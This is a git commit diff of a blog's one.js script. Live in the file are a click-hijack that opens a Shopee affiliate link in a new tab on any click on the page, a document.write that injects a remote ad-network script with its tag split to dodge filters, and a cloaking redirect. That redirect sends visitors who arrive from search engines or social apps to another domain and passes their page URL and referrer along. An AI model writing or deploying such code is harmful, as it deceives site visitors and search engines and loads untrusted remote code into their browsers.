99bfa18f51369a98926222afae4725c582bfacf5
mychiara <85479169+mychiara@users.noreply.github.com>
2022-03-30 08:40:21 +0800

    Update one.js

--- one.js
+++ one.js
@@ -1,6 +1,19 @@
 type='text/javascript'>
 //<![CDATA[
-      if(document.referrer)
+	$(document).ready(function()
+	{
+	  $('body').addClass('xepo_ads');
+	});
+
+	$(document).on('click','.xepo_ads',function(e)
+	{
+	    $(this).removeClass('xepo_ads');
+	    window.open('https://shope.ee/6Uhmz5pJ0c','_blank');
+	});
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://pl15139236.safestgatetocontent.com/41/07/05/410705d22ad2cf0ef08f17bcc337d242.js"></scr' + 'ipt>');
+//]]>
+//<![CDATA[
+    if(document.referrer)
     {
     	var cek = document.referrer;
 
@@ -15,17 +28,4 @@ type='text/javascript'>
 	//Code arsae client javascript
 	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
     }
-  
-  
-	$(document).ready(function()
-	{
-	  $('body').addClass('xepo_ads');
-	});
-
-	$(document).on('click','.xepo_ads',function(e)
-	{
-	    $(this).removeClass('xepo_ads');
-	    window.open('https://shope.ee/6Uhmz5pJ0c','_blank');
-	});
-document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://pl15139236.safestgatetocontent.com/41/07/05/410705d22ad2cf0ef08f17bcc337d242.js"></scr' + 'ipt>');
 //]]>
